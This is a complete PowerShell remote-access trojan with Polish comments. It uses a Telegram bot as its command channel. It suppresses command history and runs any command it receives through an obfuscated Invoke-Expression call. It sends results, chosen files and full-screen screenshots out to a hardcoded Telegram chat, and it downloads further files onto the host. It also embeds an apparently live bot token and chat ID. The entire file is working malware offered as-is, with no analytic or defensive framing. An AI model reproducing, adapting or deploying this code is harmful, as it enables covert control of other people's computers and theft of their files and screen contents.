Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
$api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
$session_id                 = $env:COMPUTERNAME
$Global:ProgressPreference  = 'SilentlyContinue'

# Cache publicznego IP - odswiezany co 5 min zamiast wolania ident.me przy kazdej wiadomosci
$script:cached_ip       = "N/A"
$script:cached_ip_at    = [DateTime]::MinValue

function GetPublicIP {
    if (((Get-Date) - $script:cached_ip_at).TotalMinutes -gt 5) {
        try {
            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3 -WebSession $session
            $script:cached_ip_at = Get-Date
        } catch { }
    }
    return $script:cached_ip
}

# Wewnatrz MarkdownV2 code-bloka eskejpowac trzeba TYLKO ` i \
function EscapeMd($text) {
    if ($null -eq $text) { return "" }
    return [regex]::Replace([string]$text, '([`\\])', '\$1')
}

function CheckAdminRights {
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) { return "Użytkownik '$env:USERNAME' ma uprawnienia administratora" }
    else           { return "Użytkownik '$env:USERNAME' nie ma uprawnień administratora" }
}

function DownloadUrl($url, $dest) {
    try {
        $fileName = if ($dest -and $dest.Length -gt 0) {
            $dest
        } else {
            Split-Path -Leaf ([Uri]$url).LocalPath
        }
        if (-not $fileName -or $fileName.Length -eq 0) { $fileName = "downloaded_file" }

        Invoke-WebRequest -Uri $url -OutFile $fileName -TimeoutSec 30
        if (Test-Path $fileName) { SendMessage "Pobrano: $fileName" "" }
        else                     { SendMessage "Plik nie został zapisany" "" }
    } catch { SendMessage "Błąd pobierania: $($_.Exception.Message)" "" }
}

function DownloadFile($file_id, $file_name) {
    try {
        $get_file_path = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
        $file_path     = $get_file_path.result.file_path
        Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
        if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" "" }
        else                            { SendMessage "Plik nie został pobrany" "" }
    } catch { SendMessage "Błąd pobierania pliku: $($_.Exception.Message)" "" }
}

function SendFile($filePath) {
    SendMessage "Przystępuję do wysłania pliku [$filePath]" ""
    if (Test-Path -Path $filePath -PathType Leaf) {
        try   { curl.exe -F document=@"$filePath" $api_upload_file | Out-Null }
        catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" "" }
    }
    else { SendMessage "Wskazany plik nie został znaleziony" "" }
}

function SendScreenshot {
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $left = [Int32]::MaxValue; $top = [Int32]::MaxValue
    $right = [Int32]::MinValue; $bottom = [Int32]::MinValue
    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
        if ($screen.Bounds.X -lt $left)                           { $left   = $screen.Bounds.X }
        if ($screen.Bounds.Y -lt $top)                            { $top    = $screen.Bounds.Y }
        if ($screen.Bounds.X + $screen.Bounds.Width  -gt $right)  { $right  = $screen.Bounds.X + $screen.Bounds.Width }
        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height }
    }
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
    $bmp      = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $path = "$env:APPDATA\screenshot.png"
    $bmp.Save($path)
    $graphics.Dispose()
    $bmp.Dispose()
    SendFile $path
    Remove-Item -Path $path -Force
}

function SendMessage($output, $cmd) {
    $ip   = EscapeMd (GetPublicIP)
    $sid  = EscapeMd $session_id
    $path = EscapeMd ((Get-Location).Path.Replace('\','/'))
    $c    = EscapeMd $cmd
    $o    = EscapeMd $output

    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "``$sid```n```````nIP: $ip`nPATH: [$path]`nCMD: $c`n`n$o`n``````"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
    } catch { Start-Sleep -Seconds 3 }
}

function CommandListener {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position

    # Skip starych wiadomosci przy starcie: ustaw offset za ostatnim update_id
    $offset = 0
    try {
        $init = Invoke-RestMethod -Method Get -Uri "$api_get_updates`?timeout=0" -WebSession $session
        if ($init.result.Count -gt 0) { $offset = $init.result[-1].update_id + 1 }
    } catch { }

    SendMessage "Sesja aktywna!" ""

    while ($true) {
        try {
            # Long-polling: zadanie wisi do 30s, nie polling co sekunde
            $url  = "$api_get_updates`?timeout=30&offset=$offset"
            $resp = Invoke-RestMethod -Method Get -Uri $url -WebSession $session -TimeoutSec 35

            foreach ($update in $resp.result) {
                $offset = $update.update_id + 1
                $msg    = $update.message
                if (-not $msg) { continue }

                $user_id  = $msg.chat.id
                $username = $msg.chat.username
                $text     = $msg.text
                $document = $msg.document

                if ($user_id -notmatch $telegram_id) {
                    SendMessage ("Użytkownik [{0}] {1} nieupoważniona osoba wysłała: {2}" -f $user_id, $username, $text) ""
                }

                if ($text) {
                    $parts  = $text -split ' ', 2
                    $target = $parts[0]
                    $cmd    = if ($parts.Count -gt 1) { $parts[1] } else { '' }

                    # Aliasy komend
                    $aliases = @{
                        'getip'   = 'GetPublicIP'
                        'chadmin' = 'CheckAdminRights'
                        'ss'      = 'SendScreenshot'
                        'sf'      = 'SendFile'
                    }
                    $cmdFirst = ($cmd -split ' ', 2)[0].ToLower()
                    if ($aliases.ContainsKey($cmdFirst)) {
                        $rest = if (($cmd -split ' ', 2).Count -gt 1) { ' ' + ($cmd -split ' ', 2)[1] } else { '' }
                        $cmd  = $aliases[$cmdFirst] + $rest
                    }

                    if ($cmd -match '/online')         { SendMessage "Sesja aktywna" $cmd }
                    if ($target -notmatch $session_id) { continue }
                    if ($cmd -eq 'exit')               { SendMessage "Sesja zabita" $cmd; exit }

                    if ($cmd -match '^dl\s+(\S+)(?:\s+(\S+))?$') {
                        DownloadUrl $Matches[1] $Matches[2]
                        continue
                    }

                    if ($cmd.Length -gt 0) {
                        try {
                            $first = ($cmd -split ' ', 2)[0]
                            if ($first -eq 'cd' -or $first -eq 'Set-Location') { $cmd = $cmd + '; ls' }
                            $output = .(Get-Alias ?e[?x])($cmd) | Out-String
                        } catch { $output = $Error[0] | Out-String }

                        if ([string]::IsNullOrWhiteSpace($output)) {
                            SendMessage ("Polecenie wykonane: " + $cmd) $cmd
                        } else {
                            for ($i = 0; $i -lt $output.Length; $i += 2048) {
                                $chunk = $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                                SendMessage $chunk $cmd
                                Start-Sleep -Milliseconds 100
                            }
                        }
                    }
                }

                if ($document) { DownloadFile $document.file_id $document.file_name }
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

CommandListener
